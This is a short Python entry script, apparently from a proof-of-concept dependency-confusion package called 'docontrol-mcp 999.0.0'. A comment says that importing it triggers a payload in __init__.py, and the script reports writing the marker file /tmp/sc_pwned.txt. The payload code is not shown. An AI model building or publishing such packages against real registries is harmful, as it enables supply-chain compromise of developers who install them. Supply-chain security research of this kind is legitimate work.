import docontrol_mcp_client  # triggers __init__.py payload on import
import sys

def main():
    print("docontrol-mcp 999.0.0 (SC PoC — dependency confusion)")
    print(f"Marker written to /tmp/sc_pwned.txt")
    sys.exit(0)
